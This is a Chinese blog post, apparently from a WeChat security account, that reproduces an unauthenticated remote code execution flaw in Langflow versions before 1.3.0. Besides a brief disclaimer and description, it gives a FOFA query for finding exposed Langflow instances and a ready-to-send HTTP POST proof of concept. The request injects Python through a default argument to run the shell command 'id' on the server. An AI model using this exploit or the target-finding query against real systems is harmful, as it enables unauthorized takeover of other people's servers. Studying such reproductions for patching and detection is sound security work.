#  漏洞复现 || Langflow 远程命令执行   
韩文庚  我爱林   2025-04-18 10:18  
  
## 免责声明  
  
**我爱林攻防研究院的技术文章仅供参考，****任何个人和组织使用网络应当遵守宪法法律，遵守公共秩序，尊重社会公德，不得利用网络从事危害国家安全、荣誉和利益****，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他！！！**  
## 漏洞描述  
  
        LangFlow是一个针对LangChain的GUI,它采用了反应流设计,提供了一种轻松的方式,通过拖放组件和聊天框来实验和原型化流程,将llm嵌入到您的应用程序中。  
1.3.0 之前的 Langflow 版本在/api/v1/validate/code 端点容易受到攻击  
，  
攻击者可在无需登陆的情况下执行代码，控制服务器。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/JibM0LyR9LlNUVAPv7OV0wv2ic4WkZbBwf1ibtlFeRicSALFtO0k1ShaBtY6FoBibic6gMgFz9VHFtOpTq3csUP6BDAQ/640?wx_fmt=png&from=appmsg "")  
## 资产确定  
```
fofa： product="LOGSPACE-LangFlow"
```  
## 漏洞复现  
  
1.利用如下PO  
C执行id得到回显  
```
POST /api/v1/validate/code HTTP/1.1
Host: {{hostname}}
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Content-Type: application/json
Content-Length: 133

{
  "code":
  "def exploit(cmd=exec('raise Exception(__import__(\"subprocess\").check_output(\"id\",shell=True))')):\n\n pass"
}
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/JibM0LyR9LlNUVAPv7OV0wv2ic4WkZbBwf7ic3zn80aIZHXiaNF5zrdZHMfhYbaiaGGrJCIJrztiaaxopN1XY6xLzyRw/640?wx_fmt=png&from=appmsg "")  
  
如有侵权，请联系删除  
  
感谢您抽出  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
.  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
.  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
来阅读本文  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
**点它，分享点赞在看都在这里**  
  
